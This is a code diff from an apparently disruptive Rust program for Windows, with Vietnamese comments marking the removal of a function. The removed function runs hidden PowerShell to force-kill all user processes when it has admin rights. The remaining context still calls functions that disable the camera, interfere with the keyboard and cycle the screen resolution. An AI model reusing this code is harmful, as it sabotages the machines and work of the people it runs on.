@@ -244,23 +244,7 @@ fn disableCamera() {
         .status();
 }
 
-fn killOtherProcesses() {
-    if !isAdmin() { return; }
-    let _ = Command::new("powershell")
-        .args([
-            "-WindowStyle",
-            "Hidden",
-            "-Command",
-            r#"
-            Get-Process | Where-Object {
-                $_.Id -ne $pid -and 
-                $_.SessionId -ne 0 -and
-                $_.ProcessName -notmatch '^(System|smss|csrss|wininit|services|lsass|svchost|winlogon|LogonUI|taskhostw|dwm|explorer)$'
-            } | Stop-Process -Force
-            "#,
-        ])
-        .status();
-}
+// Hàm killOtherProcesses đã bị xóa
 
 fn periodicDisableLoop() {
     loop {
@@ -448,7 +432,7 @@ fn main() {
     messKeyboard();
 
     if hasAdmin {
-        killOtherProcesses();
+        // Đã xóa lệnh gọi killOtherProcesses()
         thread::spawn(periodicDisableLoop);
         thread::spawn(cycleResolution);
     } else {
